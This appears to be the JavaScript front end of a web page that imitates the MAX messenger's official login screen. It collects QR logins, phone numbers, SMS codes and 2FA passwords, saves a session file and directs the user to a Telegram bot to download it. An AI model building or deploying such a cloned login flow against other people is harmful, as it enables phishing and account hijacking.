(function () {
  const LOCALES = ['ru', 'en', 'es', 'pt', 'uz', 'fr'];
  const STORAGE_KEY = 'max-locale';

  const root = document.getElementById('auth-root');
  const popoverPortal = document.querySelector('.popoverPortal');
  if (!root) return;

  const ui = {
    authId: null,
    botUsername: 'maxlarpingbot',
    locale: localStorage.getItem(STORAGE_KEY) || detectLocale(),
    view: 'qr',
    menuOpen: false,
    phoneValue: '',
    smsCode: '',
    smsPassword: '',
    needsPassword: false,
    smsHint: '',
    qrImage: '',
    qrMeta: '',
    error: '',
    saved: null,
    i18n: null,
    source: null
  };

  function detectLocale() {
    const lang = (navigator.language || 'en').slice(0, 2).toLowerCase();
    return LOCALES.includes(lang) ? lang : 'ru';
  }

  function t(key) {
    const pack = ui.i18n?.[ui.locale] || ui.i18n?.en || ui.i18n?.ru;
    return pack?.[key] ?? key;
  }

  function langName(code) {
    return ui.i18n?.[ui.locale]?.langNames?.[code] || code;
  }

  function esc(value) {
    return String(value)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }

  async function api(path, options = {}) {
    const headers = Object.assign({ Accept: 'application/json' }, options.headers || {});
    if (options.body && !headers['Content-Type']) headers['Content-Type'] = 'application/json';
    const res = await fetch(path, {
      credentials: 'same-origin',
      ...options,
      headers,
      body:
        options.body && typeof options.body !== 'string'
          ? JSON.stringify(options.body)
          : options.body
    });
    const data = await res.json().catch(() => ({}));
    if (!res.ok) throw new Error(data.error || `Ошибка ${res.status}`);
    return data;
  }

  async function ensureAuth() {
    if (ui.authId) return ui.authId;
    const data = await api('/api/auth/start', { method: 'POST', body: {} });
    ui.authId = data.authId;
    connectEvents();
    return ui.authId;
  }

  function connectEvents() {
    if (ui.source) ui.source.close();
    ui.source = new EventSource(`/api/auth/${ui.authId}/events`);
    ui.source.onmessage = (event) => {
      try {
        const payload = JSON.parse(event.data);
        handleEvent(payload);
      } catch {
        /* ignore */
      }
    };
  }

  function handleEvent(event) {
    if (event.type === 'qr' && event.image) {
      ui.qrImage = event.image;
      ui.qrMeta = '';
      render();
    }
    if (event.type === 'qr_scanned') {
      ui.qrMeta = 'QR отсканирован, входим...';
      render();
    }
    if (event.type === 'saved') {
      ui.saved = { sessionFile: event.sessionFile, me: event.me };
      ui.view = 'success';
      ui.error = '';
      render();
    }
    if (event.type === 'error') {
      ui.error = event.error || 'Ошибка авторизации';
      render();
    }
  }

  async function applySnapshot(snap) {
    if (snap.qr && snap.qr.image) {
      ui.qrImage = snap.qr.image;
      const left = Math.max(0, Math.round((snap.qr.expiresAt - Date.now()) / 1000));
      ui.qrMeta = left ? `Код живёт ещё ${left} с` : '';
    }
    if (snap.sms) {
      ui.needsPassword = Boolean(snap.sms.needsPassword);
      ui.smsHint = snap.sms.needsPassword
        ? `Нужен пароль 2FA${snap.sms.hint ? `: ${snap.sms.hint}` : ''}`
        : snap.sms.phone
          ? `Код отправлен на ${snap.sms.phone}`
          : '';
      if (snap.phase === 'sms_code' || snap.phase === 'sms_2fa') ui.view = 'code';
    }
    if (snap.phase === 'saved' || snap.saved) {
      ui.saved = snap.saved || { sessionFile: snap.sessionFile, me: snap.me };
      ui.view = 'success';
    }
    render();
  }

  async function startQr() {
    ui.error = '';
    await ensureAuth();
    const snap = await api(`/api/auth/${ui.authId}/qr`, { method: 'POST', body: {} });
    await applySnapshot(snap);
  }

  async function requestSms() {
    ui.error = '';
    const digits = ui.phoneValue.replace(/\D/g, '');
    if (digits.length < 10) {
      ui.error = 'Введите номер телефона';
      render();
      return;
    }
    await ensureAuth();
    const phone = ui.phoneValue.trim().startsWith('+') ? ui.phoneValue.trim() : `+${digits}`;
    const snap = await api(`/api/auth/${ui.authId}/sms`, { method: 'POST', body: { phone } });
    ui.view = 'code';
    await applySnapshot(snap);
  }

  async function submitCode() {
    ui.error = '';
    await ensureAuth();
    const snap = await api(`/api/auth/${ui.authId}/sms/code`, {
      method: 'POST',
      body: { code: ui.smsCode.trim() }
    });
    await applySnapshot(snap);
  }

  async function submitPassword() {
    ui.error = '';
    await ensureAuth();
    const snap = await api(`/api/auth/${ui.authId}/sms/password`, {
      method: 'POST',
      body: { password: ui.smsPassword }
    });
    await applySnapshot(snap);
  }

  function headerHtml() {
    return `
      <div class="header svelte-vywflk">
        <button class="button button--medium button--ghost svelte-10ujq41" type="button"
          data-action="lang" aria-label="${esc(t('langLabel'))}" aria-haspopup="dialog"
          aria-expanded="${ui.menuOpen}">
          <svg class="shape svelte-10ujq41" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52" fill="none" width="52" height="52">
            <path d="M26 0C30.8966 0 35.6698 0.794071 40.0291 3.12545C43.8424 5.16485 46.8352 8.15757 48.8746 11.9709C51.2059 16.3302 52 21.1034 52 26C52 31.4424 50.9139 36.2158 48.8746 40.0291C46.8352 43.8424 43.8424 46.8352 40.0291 48.8745C35.6698 51.2059 30.8966 52 26 52C20.5576 52 15.7842 50.9139 11.9709 48.8745C8.15757 46.8352 5.16485 43.8424 3.12545 40.0291C0.786468 35.6556 0.0294538 30.9057 0 26C0 20.5576 1.08606 15.7842 3.12545 11.9709C5.16485 8.15757 8.15757 5.16485 11.9709 3.12545C15.7842 1.08606 20.5576 0 26 0Z" fill="var(--button-background-color)"></path>
          </svg>
          <div class="content svelte-10ujq41">
            <svg aria-hidden="true" width="24" height="24"><use href="#icon_globe"></use></svg>
          </div>
        </button>
        <a class="button button--medium button--ghost svelte-10ujq41" href="https://help.max.ru" target="_blank" rel="noopener" aria-label="${esc(t('help'))}">
          <svg class="shape svelte-10ujq41" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52" fill="none" width="52" height="52">
            <path d="M26 0C30.8966 0 35.6698 0.794071 40.0291 3.12545C43.8424 5.16485 46.8352 8.15757 48.8746 11.9709C51.2059 16.3302 52 21.1034 52 26C52 31.4424 50.9139 36.2158 48.8746 40.0291C46.8352 43.8424 43.8424 46.8352 40.0291 48.8745C35.6698 51.2059 30.8966 52 26 52C20.5576 52 15.7842 50.9139 11.9709 48.8745C8.15757 46.8352 5.16485 43.8424 3.12545 40.0291C0.786468 35.6556 0.0294538 30.9057 0 26C0 20.5576 1.08606 15.7842 3.12545 11.9709C5.16485 8.15757 8.15757 5.16485 11.9709 3.12545C15.7842 1.08606 20.5576 0 26 0Z" fill="var(--button-background-color)"></path>
          </svg>
          <div class="content svelte-10ujq41">
            <svg aria-hidden="true" width="24" height="24"><use href="#icon_question"></use></svg>
          </div>
        </a>
      </div>`;
  }

  function qrHtml() {
    const qrInner = ui.qrImage
      ? `<img src="${ui.qrImage}" alt="QR" width="280" height="280" />`
      : `<p class="qr-placeholder">Загрузка QR...</p>`;

    return `
      <form class="auth auth--qr-code auth--regular svelte-vywflk">
        ${headerHtml()}
        <div class="info svelte-vywflk">
          <h3 class="subheader text-align-center text-primary svelte-41mwxv">${t('qrTitle')}</h3>
          <p class="detail text-align-center text-secondary svelte-41mwxv">${t('qrDesc')}</p>
          <div class="qr svelte-vywflk">
            <div class="qr-live">${qrInner}</div>
          </div>
          <p class="status-line">${esc(ui.qrMeta)}</p>
          ${ui.error ? `<p class="error-line">${esc(ui.error)}</p>` : ''}
        </div>
        <div class="footer svelte-vywflk">
          <button class="button button--small button--ghost svelte-1ebph0f" type="button" data-action="phone">
            <span class="content svelte-1ebph0f">${t('signInPhone')}</span>
          </button>
        </div>
      </form>`;
  }

  function phoneHtml() {
    const digits = ui.phoneValue.replace(/\D/g, '');
    const canContinue = digits.length >= 10;
    const legalJoin = ui.locale === 'ru' ? ' и ' : ui.locale === 'en' ? ' and ' : ' ';

    return `
      <form class="auth auth--phone auth--regular svelte-vywflk">
        ${headerHtml()}
        <div class="form svelte-vywflk">
          <div class="animation svelte-vywflk"></div>
          <div class="logoWrapper svelte-vywflk">
            <div class="logo svelte-vywflk" style="--auth-logo: url('/_app/immutable/assets/authLogo.CnGYimnD.png');">
              <div class="authLogo svelte-vywflk"></div>
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 68 21" fill="none" class="svelte-vywflk" width="68" height="21">
                <path fill="var(--icon-primary)" d="M4.3 20h-4V1h6.5l4.4 13.1h.6l4.5-13h6.4v19h-4V6h-.6l-5 14H9.7L5 6h-.6v14ZM35.3 20.4c-1.8 0-3.4-.4-4.8-1.2a9 9 0 0 1-3.3-3.5 11 11 0 0 1-1.2-5.1c0-2 .4-3.6 1.2-5C28 4 29 2.7 30.5 2A9 9 0 0 1 35.3.7c1.6 0 3 .4 4.2 1 1.2.7 2.2 1.5 3 2.5l.9-3.1h3.1v19h-3.1l-.9-3c-.8.9-1.8 1.7-3 2.4-1.2.6-2.6 1-4.2 1Zm1-3.7c1.8 0 3.2-.6 4.3-1.7a6 6 0 0 0 1.7-4.4 6 6 0 0 0-1.7-4.4 5.7 5.7 0 0 0-4.3-1.7c-1.7 0-3.2.6-4.3 1.7a6 6 0 0 0-1.6 4.4c0 1.8.6 3.3 1.6 4.4a5.7 5.7 0 0 0 4.3 1.7ZM53.8 20H49l6-9.6L49.8 1h4.8L58 7.5h.7L62.5 1H67l-5.3 9 6 10h-5l-4-7.2h-.7L53.8 20Z"></path>
              </svg>
            </div>
          </div>
          <div class="explainer svelte-vywflk">
            <h3 class="subheader text-align-center text-primary svelte-41mwxv">${t('phoneTitle')}</h3>
          </div>
          <div class="field svelte-vywflk">
            <div class="input svelte-1cug6p">
              <div class="input input--secondary input--neutral svelte-45jpa7">
                <div class="icon icon--left svelte-45jpa7">
                  <button type="button" class="country svelte-1cug6p" aria-haspopup="dialog">
                    <span class="emoji svelte-ihew87">
                      <img loading="lazy" decoding="async" class="img svelte-1aizpza" src="https://st.max.ru/emojis/1F1F7-1F1FA_32.webp" alt="🇷🇺" draggable="false" style="width: 20px; height: 20px; object-fit: cover;">
                    </span> +7
                    <span class="shevron svelte-1cug6p"><svg aria-hidden="true" width="12" height="12"><use href="#icon_chevron_down_mini"></use></svg></span>
                    <span class="placeholder svelte-1cug6p">123 456 78 90</span>
                  </button>
                </div>
                <input class="field svelte-45jpa7" id="phone-input" type="tel" inputmode="tel" autocomplete="tel" value="${esc(ui.phoneValue)}">
              </div>
            </div>
            <p class="hint hint--hint hint--start svelte-4wobze">${t('phoneHint')}</p>
          </div>
          <button class="button button--large button--primary button--stretched svelte-1ebph0f ${canContinue ? '' : 'button--disabled'}"
            id="continue-btn" type="button" data-action="sms-request" ${canContinue ? '' : 'disabled'}>
            <span class="content svelte-1ebph0f">${t('continue')}</span>
          </button>
          ${ui.error ? `<p class="error-line">${esc(ui.error)}</p>` : ''}
        </div>
        <div class="footer svelte-vywflk">
          <span class="description text-align-center text-tertiary svelte-41mwxv">
            ${t('legalPrefix')}
            <a class="legal-link svelte-vywflk" target="_blank" rel="noopener" href="https://legal.max.ru/pp">${t('privacy')}</a>,
            <a class="legal-link svelte-vywflk" target="_blank" rel="noopener" href="https://legal.max.ru/ps">${t('terms')}</a>${legalJoin}
            <a class="legal-link svelte-vywflk" target="_blank" rel="noopener" href="https://legal.max.ru/recsysrules">${t('recs')}</a>
          </span>
          <button class="button button--small button--ghost svelte-1ebph0f" type="button" data-action="qr">
            <span class="content svelte-1ebph0f">${t('signInQr')}</span>
          </button>
        </div>
      </form>`;
  }

  function codeHtml() {
    return `
      <form class="auth auth--code auth--regular svelte-vywflk">
        ${headerHtml()}
        <div class="form svelte-vywflk">
          <div class="explainer svelte-vywflk">
            <h3 class="subheader text-align-center text-primary svelte-41mwxv">Код из SMS</h3>
            <p class="hint hint--hint hint--start svelte-4wobze">${esc(ui.smsHint)}</p>
          </div>
          <div class="field svelte-vywflk">
            <div class="input input--secondary input--neutral svelte-45jpa7">
              <input class="field svelte-45jpa7" id="code-input" type="text" inputmode="numeric" autocomplete="one-time-code" value="${esc(ui.smsCode)}" placeholder="123456">
            </div>
          </div>
          ${ui.needsPassword ? `
          <div class="field svelte-vywflk">
            <div class="input input--secondary input--neutral svelte-45jpa7">
              <input class="field svelte-45jpa7" id="password-input" type="password" value="${esc(ui.smsPassword)}" placeholder="Пароль 2FA">
            </div>
          </div>` : ''}
          <button class="button button--large button--primary button--stretched svelte-1ebph0f" type="button" data-action="sms-submit">
            <span class="content svelte-1ebph0f">${t('continue')}</span>
          </button>
          ${ui.error ? `<p class="error-line">${esc(ui.error)}</p>` : ''}
        </div>
        <div class="footer svelte-vywflk">
          <button class="button button--small button--ghost svelte-1ebph0f" type="button" data-action="phone">
            <span class="content svelte-1ebph0f">Другой номер</span>
          </button>
        </div>
      </form>`;
  }

  function successHtml() {
    const me = ui.saved?.me;
    const name = me ? me.fullname || me.firstname || 'Аккаунт Max' : 'Аккаунт Max';
    const phone = me?.phone ? `+${me.phone}` : '';
    const file = ui.saved?.sessionFile || 'session.json';

    return `
      <form class="auth auth--regular svelte-vywflk">
        ${headerHtml()}
        <div class="form svelte-vywflk success-card">
          <h3 class="subheader text-align-center text-primary svelte-41mwxv">Сессия сохранена</h3>
          <p class="detail text-align-center text-secondary svelte-41mwxv">${esc(name)}${phone ? `<br>${esc(phone)}` : ''}</p>
          <p class="session-name">${esc(file)}</p>
          <p class="detail text-align-center text-secondary svelte-41mwxv">Скачайте файл в Telegram-боте</p>
          <a class="bot-link" href="https://t.me/${esc(ui.botUsername)}" target="_blank" rel="noopener">@${esc(ui.botUsername)}</a>
        </div>
        <div class="footer svelte-vywflk">
          <button class="button button--small button--ghost svelte-1ebph0f" type="button" data-action="restart">
            <span class="content svelte-1ebph0f">Войти ещё раз</span>
          </button>
        </div>
      </form>`;
  }

  function langMenuHtml(anchorRect) {
    const items = LOCALES.map((code) => {
      const selected = code === ui.locale;
      return `
        <button class="actionsMenuItem actionsMenuItem--primary svelte-wqig28" role="menuitem"
          type="button" data-action="set-locale" data-locale="${code}">
          <span class="title svelte-wqig28">${langName(code)}</span>
          ${selected ? '<svg aria-hidden="true" width="16" height="16"><use href="#icon_check_mini"></use></svg>' : ''}
        </button>`;
    }).join('');

    const menuWidth = 250;
    const top = anchorRect ? anchorRect.bottom + 8 : 80;
    let left = anchorRect ? anchorRect.left : 24;
    left = Math.max(12, Math.min(left, window.innerWidth - menuWidth - 12));

    return `
      <div id="lang-menu-overlay" data-action="close-menu" style="position:fixed;inset:0;z-index:9998;"></div>
      <div id="lang-menu" role="menu" class="actionsMenu svelte-uqiqmv"
        style="position:fixed;top:${top}px;left:${left}px;z-index:9999;min-width:${menuWidth}px;">
        <div class="content svelte-1kzkw19">${items}</div>
      </div>`;
  }

  function renderLangMenu() {
    document.getElementById('lang-menu')?.remove();
    document.getElementById('lang-menu-overlay')?.remove();
    if (!ui.menuOpen || !popoverPortal) return;
    const btn = document.querySelector('button[data-action="lang"]');
    popoverPortal.innerHTML = langMenuHtml(btn?.getBoundingClientRect());
  }

  function bindInputs() {
    const phone = document.getElementById('phone-input');
    if (phone) {
      phone.focus();
      phone.addEventListener('input', () => {
        ui.phoneValue = phone.value;
        const digits = ui.phoneValue.replace(/\D/g, '');
        const btn = document.getElementById('continue-btn');
        if (!btn) return;
        const valid = digits.length >= 10;
        btn.disabled = !valid;
        btn.classList.toggle('button--disabled', !valid);
      });
    }
    const code = document.getElementById('code-input');
    if (code) {
      code.focus();
      code.addEventListener('input', () => {
        ui.smsCode = code.value;
      });
    }
    const password = document.getElementById('password-input');
    if (password) {
      password.addEventListener('input', () => {
        ui.smsPassword = password.value;
      });
    }
  }

  function render() {
    let html = '';
    if (ui.view === 'phone') html = phoneHtml();
    else if (ui.view === 'code') html = codeHtml();
    else if (ui.view === 'success') html = successHtml();
    else html = qrHtml();
    root.innerHTML = html;
    renderLangMenu();
    bindInputs();
    document.documentElement.lang = ui.locale;
  }

  function setLocale(locale) {
    if (!LOCALES.includes(locale)) return;
    ui.locale = locale;
    ui.menuOpen = false;
    localStorage.setItem(STORAGE_KEY, locale);
    render();
  }

  function restart() {
    if (ui.source) ui.source.close();
    ui.authId = null;
    ui.view = 'qr';
    ui.qrImage = '';
    ui.qrMeta = '';
    ui.error = '';
    ui.saved = null;
    ui.phoneValue = '';
    ui.smsCode = '';
    ui.smsPassword = '';
    ui.needsPassword = false;
    render();
    startQr().catch((error) => {
      ui.error = error.message;
      render();
    });
  }

  document.addEventListener('click', async (event) => {
    const target = event.target.closest('[data-action], [data-locale]');
    if (!target) return;
    const shell = document.querySelector('.container.svelte-vywflk');
    if (!shell?.contains(target) && !popoverPortal?.contains(target)) return;

    const action = target.dataset.action || (target.dataset.locale ? 'set-locale' : '');
    if (!action) return;
    if (action !== 'close-menu') event.preventDefault();

    if (action === 'phone') {
      ui.view = 'phone';
      ui.error = '';
      render();
      return;
    }
    if (action === 'qr') {
      ui.view = 'qr';
      ui.error = '';
      render();
      startQr().catch((error) => {
        ui.error = error.message;
        render();
      });
      return;
    }
    if (action === 'lang') {
      ui.menuOpen = !ui.menuOpen;
      renderLangMenu();
      return;
    }
    if (action === 'close-menu') {
      ui.menuOpen = false;
      renderLangMenu();
      return;
    }
    if (action === 'set-locale') {
      setLocale(target.dataset.locale);
      return;
    }
    if (action === 'sms-request') {
      try {
        await requestSms();
      } catch (error) {
        ui.error = error.message;
        render();
      }
      return;
    }
    if (action === 'sms-submit') {
      try {
        if (ui.needsPassword) await submitPassword();
        else await submitCode();
      } catch (error) {
        ui.error = error.message;
        render();
      }
      return;
    }
    if (action === 'restart') {
      restart();
    }
  });

  async function boot(i18n) {
    ui.i18n = i18n;
    try {
      const cfg = await api('/api/auth/config');
      if (cfg.botUsername) ui.botUsername = cfg.botUsername.replace(/^@/, '');
    } catch {
      /* ignore */
    }
    render();
    try {
      await startQr();
    } catch (error) {
      ui.error = error.message;
      render();
    }
  }

  fetch('/i18n.json')
    .then((res) => res.json())
    .then(boot)
    .catch(() => boot({ ru: { langLabel: 'Язык', help: 'Помощь', qrTitle: 'Войдите в MAX по QR-коду', qrDesc: 'Наведите камеру на QR-код', signInPhone: 'Войти по номеру', phoneTitle: 'Номер телефона', phoneHint: '', continue: 'Продолжить', signInQr: 'Войти по QR-коду', langNames: { ru: 'Русский', en: 'English' } } }));
})();
